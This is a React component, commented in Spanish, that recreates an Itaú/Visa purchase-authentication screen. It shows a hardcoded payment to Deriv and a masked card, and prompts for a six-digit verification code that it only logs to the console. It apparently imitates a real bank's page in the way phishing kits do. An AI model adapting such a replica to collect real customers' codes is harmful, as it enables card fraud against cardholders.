import React, { useState } from 'react';
import "./itau_tc_pse.css";
import itauLogo from "../../img/itau_logo.png";
import visaLogo from "../../img/Visa_logo.webp";

// Se crea el componente de OTP
const ItauTcPse = () => {

  // Se crea el OTP
  const [otp, setOtp] = useState('');

  // Se crea el metodo para enviar el OTP
  const handleSubmit = (e) => {

    // Se previene el comportamiento por defecto
    e.preventDefault();

    // Se muestra el OTP en la consola
    console.log('Itaú OTP Submitted:', otp);
  };

  // Se retorna
  return (
    <div className="itau-otp-container">
      <div className="itau-otp-card">
        {/* Close Button */}
        <button
          className="itau-otp-close"
          onClick={() => console.log('Cerrar')}
          title="Cerrar"
        >
          X
        </button>

        {/* Header with Logos */}
        <div className="itau-otp-header">
          <div className="itau-logo">
            <img src={itauLogo} alt="Itaú" className="itau-logo-img" />
          </div>
          <div className="visa-logo">
            <img src={visaLogo} alt="VISA" className="visa-logo-img" />
          </div>
        </div>

        {/* Body Content */}
        <div className="itau-otp-body">
          <h2 className="itau-otp-title">Autenticación de compra</h2>

          <div className="itau-otp-description">
            <p>Te hemos enviado un código de verificación al E-Mail</p>
            <p>
              Estás autorizando un pago a <strong>Deriv</strong> por <strong>$6,712.00 USD</strong> el <strong>07/05/2025</strong> con tu tarjeta <strong>************1371</strong>.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="itau-otp-form">
            <label className="itau-otp-label">Código de verificación</label>
            <input
              type="text"
              className="itau-otp-input"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              placeholder=""
              autoFocus
            />

            <button type="submit" className="itau-otp-submit">
              CONTINUAR
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: 'center' }}>
            <button
              className="itau-otp-resend"
              onClick={() => console.log('Reenviar código')}
            >
              REENVIAR CÓDIGO DE VERIFICACIÓN
            </button>
          </div>

          <button
            className="itau-otp-terms"
            onClick={() => console.log('Términos y condiciones')}
          >
            Términos y condiciones
          </button>
        </div>
      </div>
    </div>
  );
};

// Se exporta el componente
export default ItauTcPse;